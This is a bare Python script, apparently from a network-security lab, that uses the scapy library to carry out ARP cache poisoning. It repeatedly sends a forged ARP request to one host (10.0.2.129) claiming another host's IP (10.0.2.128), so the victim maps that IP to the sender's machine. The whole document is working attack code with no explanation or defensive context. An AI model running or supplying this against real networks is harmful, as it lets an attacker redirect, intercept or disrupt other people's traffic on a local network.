#!/usr/bin/python3

from scapy.all import *
from time import sleep

a_ip='10.0.2.128'
b_ip='10.0.2.129'
b_mac='00:0c:29:c0:06:ad'

E = Ether(dst=b_mac)
A = ARP(op='who-has', psrc=a_ip, pdst=b_ip, hwdst=b_mac)
pkt = E/A

while True:
    sendp(pkt)
    sleep(0.1)
